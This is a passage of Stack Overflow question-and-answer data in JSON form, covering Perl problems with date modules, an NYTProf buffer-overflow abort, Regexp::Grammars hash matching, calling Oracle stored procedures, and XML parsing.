"profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1462813568, "post_id": 37121032, "comment_id": 61783912, "body": "Is there another date library I can use that would have these two functions available?"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 2, "creation_date": 1462814031, "post_id": 37121032, "comment_id": 61784181, "body": "The Perl equivalent of <code>pear</code> is <code>cpan</code>, which downloads and installs modules and handles dependencies automatically. You can also use your system&#39;s package manager, e.g. <code>yum</code>, <code>apt-get</code>. Unfortunately, the module Date::DateCalc isn&#39;t on CPAN; according to the link in my last comment, it&#39;s available on backpan. If you can, you should really switch to a module that&#39;s actually maintained, like <a href=\"https://metacpan.org/pod/DateTime\" rel=\"nofollow noreferrer\">DateTime</a>."}, {"owner": {"reputation": 29, "user_id": 6311434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/23e65c9f78e6c567b436bcf6dbfadf02?s=128&d=identicon&r=PG&f=1", "display_name": "Arkan", "link": "https://stackoverflow.com/users/6311434/arkan"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1462815185, "post_id": 37121032, "comment_id": 61784770, "body": "Is DateTime the most widely used library of this type?   i mainly need to get the difference between two dates."}, {"owner": {"reputation": 29, "user_id": 6311434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/23e65c9f78e6c567b436bcf6dbfadf02?s=128&d=identicon&r=PG&f=1", "display_name": "Arkan", "link": "https://stackoverflow.com/users/6311434/arkan"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1462817620, "post_id": 37121032, "comment_id": 61786153, "body": "I found the library.  But it looks like it won&#39;t compile on my new system and is a perl front end for a c-based library.  Perhaps the work around is to find a new source to replace this function:  dates_difference($year,$month,$day,$cyear,$curmon,$cmday)"}], "answers": [{"tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 0, "last_activity_date": 1462873860, "creation_date": 1462873860, "answer_id": 37134941, "question_id": 37121032, "link": "https://stackoverflow.com/questions/37121032/updating-perl-date-functions-datedatecalc-pm-not-found/37134941#37134941", "title": "Updating Perl date functions? Date::Datecalc.pm not found", "body": "<p>Date::DateCalc isn't a Perl library that I recognise. It's not available on <a href=\"http://metacpan.org/\" rel=\"nofollow\">CPAN</a>, so I assume it's a library that is written in-house or something that your project has acquired from elsewhere. You'll need to find out where it came from and see if you reinstall it from there. It may be possible to copy it from the old server onto the new one - but that can sometimes be a tricky undertaking.</p>\n\n<p>For several years, <a href=\"https://metacpan.org/pod/Time::Piece\" rel=\"nofollow\">Time::Piece</a> and <a href=\"https://metacpan.org/pod/Time::Seconds\" rel=\"nofollow\">Time::Seconds</a> have been included in the standard Perl library. Neither of them have the specific subroutines that you ask for, but it would be simple to write them both based on these modules.</p>\n\n<p>If you tell us what the input and output of these subroutines are, then someone here might write them for you.</p>\n"}], "owner": {"reputation": 29, "user_id": 6311434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/23e65c9f78e6c567b436bcf6dbfadf02?s=128&d=identicon&r=PG&f=1", "display_name": "Arkan", "link": "https://stackoverflow.com/users/6311434/arkan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 124, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1462873860, "creation_date": 1462811908, "question_id": 37121032, "link": "https://stackoverflow.com/questions/37121032/updating-perl-date-functions-datedatecalc-pm-not-found", "title": "Updating Perl date functions? Date::Datecalc.pm not found", "body": "<p>I'm migrating a Perl script to a new system and am running into problems.  I ran \"pear install date\" and installed the Date module but this script is expecting some subroutines that seem to no longer be available?</p>\n\n<p>When I run the script I get:</p>\n\n<pre><code>Can't locate Date/DateCalc.pm in @INC (@INC contains: /usr/local/lib64/perl5 /usr/local/share/perl5 /usr/lib64/perl5/vendor_perl /usr/share/perl5/vendor_perl /usr/lib64/perl5 /usr/share/perl5 .) at ./script.pl line 23.\n</code></pre>\n\n<p>I'm using these two functions which seem to not be available on this new system.</p>\n\n<pre><code>use Date::DateCalc qw(day_of_week dates_difference);\n</code></pre>\n\n<p>Is there a new library I need to install or change the reference to these functions in order to access them?</p>\n"}, {"tags": ["perl", "devel-nytprof"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1462807515, "post_id": 37118780, "comment_id": 61780171, "body": "Is <code>uwsgi</code> suiciding, or is it being killed? If it&#39;s the former, you&#39;d need to debug <code>uwsgi</code>. it To debug a binary program, one normally uses <code>gdb</code>."}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1462816941, "post_id": 37118780, "comment_id": 61785760, "body": "If you are referring to <a href=\"https://git-scm.com/docs/git-bisect\" rel=\"nofollow noreferrer\"><code>git bisect</code></a>, then go for it! You can completely automate <code>bisect</code> with a script that returns 0 (for OK) for &quot;good&quot; commits and !=0 for &quot;bad&quot; commits. Even for 4000 commits it will take only ln2(4000) \u2248 12 steps to find the ultimate bad commit."}, {"owner": {"reputation": 10748, "user_id": 13992, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/c81f585328c241594864f888f1154025?s=128&d=identicon&r=PG", "display_name": "badp", "link": "https://stackoverflow.com/users/13992/badp"}, "edited": false, "score": 0, "creation_date": 1462964608, "post_id": 37118780, "comment_id": 61856865, "body": "see the note about the build-time environment variable <code>NYTP_MAX_SUB_NAME_LEN</code> in <a href=\"http://search.cpan.org/~timb/Devel-NYTProf-6.03/lib/Devel/NYTProf.pm#panic:_buffer_overflow_\" rel=\"nofollow noreferrer\">search.cpan.org/~timb/Devel-NYTProf-6.03/lib/Devel/&hellip;</a>... though the default value is 500 characters."}], "owner": {"reputation": 655, "user_id": 523146, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/94939636aadc87dd27617b469a3493b5?s=128&d=identicon&r=PG", "display_name": "Gyanendra Singh", "link": "https://stackoverflow.com/users/523146/gyanendra-singh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 114, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1462805218, "creation_date": 1462805218, "question_id": 37118780, "link": "https://stackoverflow.com/questions/37118780/buffer-overflow-when-running-nytprofiler", "title": "Buffer overflow when running nytprofiler", "body": "<p>I am getting </p>\n\n<blockquote>\n  <p><strong>* buffer overflow detected *</strong>: /usr/sbin/uwsgi terminated</p>\n</blockquote>\n\n<p>error when trying to run nytprofiler. How can I go about debugging this, and what could be the possible cause? I know that its some code change that is resulting in this error, because when I switch to a very old commit, it works fine. Since the number of commits is too damn high, I can't realistically go in for a \"git bisect\" kind of a thing.</p>\n"}, {"tags": ["regex", "perl", "regexp-grammars"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1462804629, "post_id": 37118046, "comment_id": 61778158, "body": "Not a dup of that. This is a Regexp::Grammars question"}, {"owner": {"reputation": 737, "user_id": 734062, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/5579b17e7d2228c75a45d0f6365ba983?s=128&d=identicon&r=PG", "display_name": "psgels", "link": "https://stackoverflow.com/users/734062/psgels"}, "edited": false, "score": 0, "creation_date": 1462805040, "post_id": 37118046, "comment_id": 61778455, "body": "Unfortunately, Tieing the hash doesn&#39;t seem to help."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1462805241, "post_id": 37118046, "comment_id": 61778615, "body": "@psgels, Does <code>(?i: &lt;%commands&gt; )</code> work? If not, you may need to build the pattern yourself."}, {"owner": {"reputation": 737, "user_id": 734062, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/5579b17e7d2228c75a45d0f6365ba983?s=128&d=identicon&r=PG", "display_name": "psgels", "link": "https://stackoverflow.com/users/734062/psgels"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1462805373, "post_id": 37118046, "comment_id": 61778719, "body": "@ikegami: unfortunately, it does not. What do you mean by building the pattern myself?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1462805503, "post_id": 37118046, "comment_id": 61778815, "body": "Either dynamically or statically build a regex pattern that matches the keys of the hash insensitively, and using that pattern in the grammar instead of <code>&lt;%commands&gt;</code>"}], "answers": [{"comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1462808094, "post_id": 37118986, "comment_id": 61780600, "body": "&quot;From the documentation, it sounds like...&quot; Confirmed. I&#39;ve never used Regexp::Grammars but it seems to have a weird idea of what a token is. You can also get around this by adding anchors to the pattern: <code>my $grammar = qr{ \\A &lt;command&gt; \\z &lt;token: command&gt; &lt;%commands&gt; };</code>"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1462808476, "post_id": 37118986, "comment_id": 61780833, "body": "@ThisSuitIsBlackNot, You don&#39;t want to have to enforce the boundary everywhere <code>&lt;command&gt;</code> is used. The check should be inside the token. Instead, use <code>&lt;token: command&gt; \\b &lt;%commands&gt; \\b</code> (though that assumes that all the keys of <code>%commands</code> start and end with a <code>\\w</code> char.)"}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 5, "last_activity_date": 1462807342, "last_edit_date": 1462807342, "creation_date": 1462805843, "answer_id": 37118986, "question_id": 37118046, "link": "https://stackoverflow.com/questions/37118046/case-insensitive-hash-keys-in-regexpgrammars/37118986#37118986", "title": "Case-insensitive hash-keys in Regexp::Grammars", "body": "<p>From the documentation, it sounds like <code>&lt;%commands&gt;</code> would match <code>Wait</code> of <code>Waiting</code>, so even a case-insensitive version of <code>&lt;%commands&gt;</code> would be less than ideal.</p>\n\n<p>You normally want to match a generic identifier, and independently check if the identifier is a valid command. This is what prevents <code>printfoo();</code> from being equivalent to <code>print foo();</code> in Perl.</p>\n\n<p>May I suggest the following:</p>\n\n<pre><code>use feature qw( fc );\n\nour %commands = map { fc($_) =&gt; 1 } qw(\n   Basic_import\n   Wait\n   Reload\n   Log\n); \n\n&lt;rule: command&gt; (&lt;ident&gt;) &lt;require: (?{ $commands{fc($CAPTURE)} })&gt;\n\n&lt;token: ident&gt; \\w+\n</code></pre>\n\n<p>You can probably get away with using <code>lc</code> instead of <code>fc</code> if you want backwards compatibility with version of Perl older than 5.16.</p>\n"}, {"comments": [{"owner": {"reputation": 737, "user_id": 734062, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/5579b17e7d2228c75a45d0f6365ba983?s=128&d=identicon&r=PG", "display_name": "psgels", "link": "https://stackoverflow.com/users/734062/psgels"}, "edited": false, "score": 0, "creation_date": 1462807520, "post_id": 37119344, "comment_id": 61780174, "body": "Yes, this one works. I must have mistyped something when I tried it the first time. Thanks!"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1462808689, "post_id": 37119344, "comment_id": 61780971, "body": "Tip: <code>&lt;token: command&gt; \\b &lt;%commands&gt; \\b</code> would be better, as it addresses the <code>printfoo();</code> vs <code>print foo();</code> problem I mentioned in my answer. (You&#39;ll need to adjust if the keys of <code>%commands</code> can start or end with something other than a <code>\\w</code> char)."}], "tags": [], "owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "is_accepted": true, "score": 2, "last_activity_date": 1490223923, "last_edit_date": 1490223923, "creation_date": 1462806819, "answer_id": 37119344, "question_id": 37118046, "link": "https://stackoverflow.com/questions/37118046/case-insensitive-hash-keys-in-regexpgrammars/37119344#37119344", "title": "Case-insensitive hash-keys in Regexp::Grammars", "body": "<p>You can use <a href=\"https://metacpan.org/pod/Hash::Case::Preserve\" rel=\"nofollow noreferrer\">Hash::Case::Preserve</a> to make hash lookups case insensitive:</p>\n\n<pre><code>use strict;\nuse warnings 'all';\n\nuse Data::Dump;\nuse Hash::Case::Preserve;\nuse Regexp::Grammars;\n\ntie my %commands, 'Hash::Case::Preserve';\n\n%commands = (\n    'Basic_import'  =&gt; 1,\n    'Wait'          =&gt; 1,\n    'Reload'        =&gt; 1,\n    'Log'           =&gt; 1,\n);\n\nmy $grammar = qr{\n\n    &lt;command&gt;\n\n    &lt;token: command&gt;    &lt;%commands&gt;\n\n};  \n\ndd \\%/ if 'basic_import' =~ $grammar;\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>{ \"\" =&gt; \"basic_import\", \"command\" =&gt; \"basic_import\" }\n</code></pre>\n\n<p>Note that you have to <code>tie</code> the hash <em>before</em> inserting any values into it.</p>\n"}, {"tags": [], "owner": {"reputation": 77, "user_id": 11091125, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/384fa761278fe27570e608f22f2d2aaf?s=128&d=identicon&r=PG", "display_name": "druid62", "link": "https://stackoverflow.com/users/11091125/druid62"}, "is_accepted": false, "score": 0, "last_activity_date": 1566305181, "creation_date": 1566305181, "answer_id": 57574028, "question_id": 37118046, "link": "https://stackoverflow.com/questions/37118046/case-insensitive-hash-keys-in-regexpgrammars/57574028#57574028", "title": "Case-insensitive hash-keys in Regexp::Grammars", "body": "<pre><code>%commands = map { lc($_) =&gt; 1, $_ =&gt; 1 } qw(\n    Basic_import\n    Wait\n    Reload\n    Log\n);\n</code></pre>\n"}], "owner": {"reputation": 737, "user_id": 734062, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/5579b17e7d2228c75a45d0f6365ba983?s=128&d=identicon&r=PG", "display_name": "psgels", "link": "https://stackoverflow.com/users/734062/psgels"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 128, "favorite_count": 0, "accepted_answer_id": 37119344, "answer_count": 3, "score": 5, "last_activity_date": 1566305181, "creation_date": 1462803239, "last_edit_date": 1462804268, "question_id": 37118046, "link": "https://stackoverflow.com/questions/37118046/case-insensitive-hash-keys-in-regexpgrammars", "title": "Case-insensitive hash-keys in Regexp::Grammars", "body": "<p>In the perl module Regexp::Grammars, consider the following token:</p>\n\n<pre><code>&lt;token: command&gt;       &lt;%commands&gt;\n</code></pre>\n\n<p>This token is part of a complex grammar, parsing a wide variety of different sentences. </p>\n\n<p>This token matches any word in the hash %commands, which I have defined as follows (of course, outside any function):</p>\n\n<pre><code>our %commands = (\n    'Basic_import'  =&gt; 1,\n    'Wait'          =&gt; 1,\n    'Reload'        =&gt; 1,\n    'Log'           =&gt; 1,\n); \n</code></pre>\n\n<p>This works, for matching keywords like \"Basic_import\", \"Wait\", etc. However, I also want it to match on words like \"basic_import\", \"wait\", etc. </p>\n\n<p>How do I make this hash case insensitive without having to copy and paste every keyword multiple times? Because this is part of a complex grammar, I want to use Regexp::Grammars, and I'd prefer not to have to revert to a grep for this particular exception. </p>\n"}, {"tags": ["perl", "plsql"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1462794520, "post_id": 37114989, "comment_id": 61771121, "body": "There is no <i>subroutine</i> in your code."}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 5, "creation_date": 1462794567, "post_id": 37114989, "comment_id": 61771145, "body": "Use <a href=\"http://p3rl.org/DBI\" rel=\"nofollow noreferrer\">DBI</a> to talk to a database."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1462794629, "post_id": 37114989, "comment_id": 61771180, "body": "Add <code>use strict</code> and <code>use warnings</code>. But even without, it should tell you about the syntax errors with your HEREDOC."}, {"owner": {"reputation": 59, "user_id": 6238985, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/f8fb421a38806ec746c36aa8d72c1d61?s=128&d=identicon&r=PG&f=1", "display_name": "GSG", "link": "https://stackoverflow.com/users/6238985/gsg"}, "edited": false, "score": 0, "creation_date": 1462795100, "post_id": 37114989, "comment_id": 61771464, "body": "I have pasted the code of the subroutine here. I am calling the same from main with the below syntax.                                                                                 init($scr)                                                                                                                      where $scr is being passed from the main script.                                                Also I am getting a warning : warning: here-document at line 0 delimited by end-of-file (wanted `EOF&#39;)"}, {"owner": {"reputation": 3327, "user_id": 1604311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/0frKT.jpg?s=128&g=1", "display_name": "Arunesh Singh", "link": "https://stackoverflow.com/users/1604311/arunesh-singh"}, "edited": false, "score": 0, "creation_date": 1462796780, "post_id": 37114989, "comment_id": 61772573, "body": "You should remove preceeding spaces before EOF i.e change to <code>&lt;&lt;  EOF</code> to <code>&lt;&lt;EOF</code>."}, {"owner": {"reputation": 59, "user_id": 6238985, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/f8fb421a38806ec746c36aa8d72c1d61?s=128&d=identicon&r=PG&f=1", "display_name": "GSG", "link": "https://stackoverflow.com/users/6238985/gsg"}, "edited": false, "score": 0, "creation_date": 1462798286, "post_id": 37114989, "comment_id": 61773574, "body": "I have rephrased my code in the following way.                                                     \t my $dbh =  DBI-&gt;connect(&#39;dbi:Oracle:&#39;, &#39;test/test@testdb&#39;); eval { my $proc =               $dbh-&gt;prepare(                 q{BEGIN} . &quot; MIG_STATUS_AUDIT.MIG_INIT_SINGLE_SCRIPT ($var, $scr, $task) &quot;.q{;END;} ); $proc-&gt;execute; };                                                                                                                        but now getting the error- &quot;Encountered the symbol &quot;)&quot; when expecting one of the following:&quot;. Am I missing something silly here?"}, {"owner": {"reputation": 59, "user_id": 6238985, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/f8fb421a38806ec746c36aa8d72c1d61?s=128&d=identicon&r=PG&f=1", "display_name": "GSG", "link": "https://stackoverflow.com/users/6238985/gsg"}, "edited": false, "score": 0, "creation_date": 1462798514, "post_id": 37114989, "comment_id": 61773736, "body": "the parameters used in my previous comment are given below.  my $task = &#39;&#39;;   my $scr = &#39;Migstart.pl&#39;;   my $var = $_[0];   my $script = &quot; MIG_STATUS_AUDIT.MIG_INIT_SINGLE_SCRIPT ($var, $scr, $task) &quot;;"}], "answers": [{"comments": [{"owner": {"reputation": 59, "user_id": 6238985, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/f8fb421a38806ec746c36aa8d72c1d61?s=128&d=identicon&r=PG&f=1", "display_name": "GSG", "link": "https://stackoverflow.com/users/6238985/gsg"}, "edited": false, "score": 0, "creation_date": 1462858609, "post_id": 37118379, "comment_id": 61800039, "body": "Thanks for all your replies. I was able to call the stored proc with the use of DBI. I was just missing few QUOTES in the last code snippet I posted here. Thanks again."}, {"owner": {"reputation": 1523, "user_id": 2079373, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/etR7x.png?s=128&g=1", "display_name": "tale852150", "link": "https://stackoverflow.com/users/2079373/tale852150"}, "reply_to_user": {"reputation": 59, "user_id": 6238985, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/f8fb421a38806ec746c36aa8d72c1d61?s=128&d=identicon&r=PG&f=1", "display_name": "GSG", "link": "https://stackoverflow.com/users/6238985/gsg"}, "edited": false, "score": 0, "creation_date": 1464277891, "post_id": 37118379, "comment_id": 62429886, "body": "@Gourab Sengupta - glad we could help.  Can I get an upvote for this answer, please?  Thanks in advance,"}], "tags": [], "owner": {"reputation": 1523, "user_id": 2079373, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/etR7x.png?s=128&g=1", "display_name": "tale852150", "link": "https://stackoverflow.com/users/2079373/tale852150"}, "is_accepted": true, "score": 0, "last_activity_date": 1462804126, "creation_date": 1462804126, "answer_id": 37118379, "question_id": 37114989, "link": "https://stackoverflow.com/questions/37114989/calling-a-stored-proc-from-perl/37118379#37118379", "title": "Calling a stored proc from perl", "body": "<p>As mentioned by user @choroba in the comments above, the best way IMHO is to use Perl's DBI module.</p>\n\n<p>Here is an example of calling your stored procedure that would work with Oracle:</p>\n\n<pre><code>$dbh-&gt;do(\"BEGIN your_procedure; END;\");\n</code></pre>\n\n<p>And here is a link to help you get started with the DBI module:</p>\n\n<p><a href=\"http://dbi.perl.org/\" rel=\"nofollow\">Perl DBI</a></p>\n\n<p>HTH   </p>\n"}, {"tags": [], "owner": {"reputation": 41, "user_id": 6324971, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1a303b893aef93104b4a19f539d65c13?s=128&d=identicon&r=PG&f=1", "display_name": "ChrisKee", "link": "https://stackoverflow.com/users/6324971/chriskee"}, "is_accepted": false, "score": 0, "last_activity_date": 1463052737, "creation_date": 1463052737, "answer_id": 37185637, "question_id": 37114989, "link": "https://stackoverflow.com/questions/37114989/calling-a-stored-proc-from-perl/37185637#37185637", "title": "Calling a stored proc from perl", "body": "<p>for me works this solution good:</p>\n\n<pre><code>my $execute=q~BEGIN your_procedure; END~;\nmy $sth= $dbh-&gt;prepare($execute);\n   $sth-&gt;execute()\n</code></pre>\n"}], "owner": {"reputation": 59, "user_id": 6238985, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/f8fb421a38806ec746c36aa8d72c1d61?s=128&d=identicon&r=PG&f=1", "display_name": "GSG", "link": "https://stackoverflow.com/users/6238985/gsg"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 999, "favorite_count": 0, "accepted_answer_id": 37118379, "answer_count": 2, "score": 0, "last_activity_date": 1463052737, "creation_date": 1462794362, "last_edit_date": 1462794464, "question_id": 37114989, "link": "https://stackoverflow.com/questions/37114989/calling-a-stored-proc-from-perl", "title": "Calling a stored proc from perl", "body": "<p>I am running this subroutine from the main script.</p>\n\n<pre><code>print \"parameter passed: $_[0]\";\nmy $connect_string = 'test/test@testdb';\nmy $sqlplus_settings = '';\nmy $task = '';\nmy $result = qx { sqlplus $connect_string &lt;&lt; EOF\n$sqlplus_settings exec {pkgname.procedure($_[0], 'abc',$task);\n#exit;\nEOF\n</code></pre>\n\n<p>When it is getting called from the main script <code>{sub($var)}</code>, it is printing the first line with the input parameter. But the procedure is not getting executed. </p>\n"}, {"tags": ["xml", "perl"], "answers": [{"tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": true, "score": 7, "last_activity_date": 1462789853, "last_edit_date": 1495542239, "creation_date": 1462789853, "answer_id": 37113491, "question_id": 37113405, "link": "https://stackoverflow.com/questions/37113405/xmlsimple-in-perl-with-mixed-xml-file/37113491#37113491", "title": "XML::Simple in perl, with mixed xml file", "body": "<p>Rule one of using <code>XML::Simple</code>: <a href=\"https://stackoverflow.com/questions/33267765/why-is-xmlsimple-discouraged\">Don't, use something else.</a> </p>\n\n<p>I like <code>XML::Twig</code> and your problem looks like this:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nuse XML::Twig;\n\nmy $twig = XML::Twig -&gt; new -&gt; parsefile('DEMO.xml'); \nforeach my $pattern ( $twig -&gt; get_xpath ('//pattern') ) {\n   print $pattern -&gt; text,\"\\n\";\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 2, "last_activity_date": 1462806069, "last_edit_date": 1462806069, "creation_date": 1462804388, "answer_id": 37118468, "question_id": 37113405, "link": "https://stackoverflow.com/questions/37113405/xmlsimple-in-perl-with-mixed-xml-file/37118468#37118468", "title": "XML::Simple in perl, with mixed xml file", "body": "<p>Yeah. Don't use XML::Simple.</p>\n\n<p>I'd do it with XML::LibXML and a bit of XPath.</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nuse 5.010;\n\nuse XML::LibXML;\n\nmy $parser = XML::LibXML-&gt;new();\nmy $doc = $parser-&gt;parse_file(shift);\n\nprint $doc-&gt;findvalue('//text()');\n</code></pre>\n\n<p>Which does this:</p>\n\n<pre><code>$ perl xml2text test.xml\n\n123456\n654321\nabcdefg\nheloworld\nperlprogramming\n</code></pre>\n"}], "owner": {"reputation": 269, "user_id": 6239384, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/491422b5d64a8d352c3babc8d2771d6e?s=128&d=identicon&r=PG&f=1", "display_name": "AlexPham", "link": "https://stackoverflow.com/users/6239384/alexpham"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 111, "favorite_count": 1, "accepted_answer_id": 37113491, "answer_count": 2, "score": 5, "last_activity_date": 1462806069, "creation_date": 1462789606, "question_id": 37113405, "link": "https://stackoverflow.com/questions/37113405/xmlsimple-in-perl-with-mixed-xml-file", "title": "XML::Simple in perl, with mixed xml file", "body": "<p>I have an DEMO.xml file look like this.</p>\n\n<pre><code>&lt;?xml 